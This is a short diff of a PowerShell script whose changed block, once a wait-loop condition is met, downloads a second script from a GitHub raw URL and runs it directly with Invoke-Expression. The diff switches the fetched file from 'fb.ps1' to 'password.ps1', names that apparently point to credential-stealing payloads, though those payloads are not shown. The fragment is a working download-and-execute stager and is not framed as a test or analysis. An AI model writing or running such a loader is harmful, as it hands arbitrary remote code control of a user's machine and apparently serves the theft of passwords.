@@ -41,7 +41,7 @@ while (-not $conditionMet) {
 
 # After the condition is met, download and execute your second script from GitHub
 if ($conditionMet) {
-    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ps1"
+    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/password.ps1"
     $secondScript = Invoke-WebRequest -Uri $secondScriptUrl
     Invoke-Expression -Command $secondScript.Content
 }
